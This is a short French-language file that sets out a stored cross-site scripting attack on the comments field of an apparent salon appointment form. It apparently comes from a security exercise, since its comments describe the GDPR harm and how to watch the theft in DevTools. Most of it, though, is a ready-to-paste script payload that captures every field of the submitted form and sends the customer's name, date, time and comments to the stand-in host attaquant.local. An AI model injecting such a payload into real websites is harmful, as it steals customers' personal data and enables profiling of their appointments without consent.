// ATTAQUE XSS — VOL DE DONNÉES CLIENT (exfiltration)
// Champ ciblé : Commentaires
// Effet : à chaque fois qu'un client soumet une réservation, ses données personnelles
//         (nom, date, heure, commentaires) sont envoyées à l'attaquant avant même d'arriver au serveur
// Danger réel : violation RGPD — les données personnelles des clients du salon sont volées
//               l'attaquant constitue une liste de clients avec leurs horaires de rendez-vous
// Vérification : ouvrir DevTools > Réseau, remplir et soumettre le formulaire,
//               observer la requête GET vers attaquant.local avec les données en paramètres

// ===== PAYLOAD À COLLER =====
<script>document.getElementById('appointment-form').addEventListener('submit',function(){var d=new FormData(this);var p=[];d.forEach(function(v,k){p.push(k+'='+encodeURIComponent(v));});new Image().src='http://attaquant.local/steal?'+p.join('&');});</script>
